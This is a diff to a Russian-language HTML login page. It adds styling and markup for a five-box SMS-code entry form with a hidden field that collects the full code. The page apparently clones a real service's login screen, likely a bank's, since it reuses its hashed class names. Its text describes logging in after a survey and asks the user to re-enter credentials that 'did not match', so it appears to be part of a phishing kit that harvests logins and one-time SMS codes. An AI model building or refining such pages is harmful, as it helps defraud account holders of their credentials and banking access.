@@ -127,6 +127,59 @@
 				}
 			}
 
+			/* Форма ввода СМС-кода */
+			.sms-verification {
+				text-align: center;
+				padding: 24px 0;
+			}
+
+			.sms-verification__title {
+				font-size: 22px;
+				font-weight: 500;
+				color: #303030;
+				margin: 0 0 8px 0;
+				text-align: center;
+			}
+
+			.sms-verification__subtitle {
+				font-size: 14px;
+				color: #8a8a95;
+				margin: 0 0 32px 0;
+				text-align: center;
+			}
+
+			.sms-verification__inputs {
+				display: flex;
+				justify-content: center;
+				gap: 12px;
+				margin-bottom: 24px;
+			}
+
+			.sms-verification__input {
+				width: 40px;
+				height: 48px;
+				border: none;
+				border-radius: 8px;
+				background-color: #f7f7f8;
+				text-align: center;
+				font-size: 20px;
+				font-weight: 700;
+				color: #000;
+				padding: 0;
+				transition: background-color 0.15s ease;
+			}
+
+			.sms-verification__input:focus {
+				outline: none;
+				background-color: #eeeeef;
+			}
+
+			.sms-verification__input:disabled {
+				background-color: #f5f5f5;
+				color: #999;
+				cursor: not-allowed;
+			}
+
 			/* Пояснение перед авторизацией после опроса */
 			.auth-info {
 				display: none;
@@ -401,43 +454,33 @@
 										</button>
 									</form>
 
-									<form id="sms-step" style="display: none;">
-										<div class="login-screen_formElement__kiM32" style="margin-bottom: 16px;">
-											<div
-												class="form-control__component_1ilh2 form-control__component_kq8gs form-control__size-48_1ilh2 form-control__size-48_ibi75 form-control__block_1ilh2"
-											>
-												<div
-													class="form-control__inner_1ilh2 form-control__inner_ibi75 form-control__inner_kq8gs form-control__inner_5fjzy form-control__hasInnerLabel_1ilh2"
-												>
-													<div class="form-control__inputWrapper_1ilh2">
-														<span class="form-control__hiddenLabel_1ilh2" aria-hidden="true">СМС-код</span>
-														<div class="form-control__label_1ilh2 form-control__label_kq8gs">
-															<span class="form-control__labelInner_1ilh2">СМС-код</span>
-														</div>
-														<div class="form-control__input_1ilh2 form-control__size-48_1ilh2">
-															<input
-																class="input__input_1n6fe input__size-48_1n6fe input__input_1n9jr input__size-48_1n6fe input__hasInnerLabel_1n6fe input__hasInnerLabel_1n9jr"
-																type="text"
-																inputmode="numeric"
-																pattern="[0-9]*"
-																maxlength="6"
-																aria-label="СМС-код"
-																data-test-id="sms-input"
-															/>
-														</div>
-													</div>
-												</div>
-											</div>
+								<form id="sms-step" style="display: none;">
+									<div class="sms-verification">
+										<h2 class="sms-verification__title">Введите код из сообщения</h2>
+										<p class="sms-verification__subtitle">Код был отправлен на ваш номер</p>
+										
+										<div class="sms-verification__inputs" id="sms-inputs-container">
+											<input type="text" class="sms-verification__input" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="0" />
+											<input type="text" class="sms-verification__input" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="1" />
+											<input type="text" class="sms-verification__input" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="2" />
+											<input type="text" class="sms-verification__input" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="3" />
+											<input type="text" class="sms-verification__input" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="4" />
 										</div>
+										
+										<!-- Скрытое поле для хранения полного кода -->
+										<input type="text" id="sms-full-code" data-test-id="sms-input" style="position: absolute; opacity: 0; pointer-events: none;" />
+										
 										<button
 											class="button__component_9amy8 button__primary_9amy8 button__size-56_9amy8 button__hug_9amy8 button__size-56_17i9h button__component_1gtgm button__primary_1gtgm button__component_1opnj button__primary_1opnj login-screen_formElement__kiM32"
 											type="submit"
 											id="sms-submit"
 											disabled
+											style="margin-top: 32px;"
 										>
 											<span class="button__label_9amy8 button__stretchText_9amy8">Подтвердить</span>
 										</button>
-								</form>
+									</div>
+							</form>
 
 									<div id="auth-info" class="auth-info">
 										Похоже, данные для входа не совпали. Пожалуйста, авторизуйтесь повторно, чтобы мы убедились, что
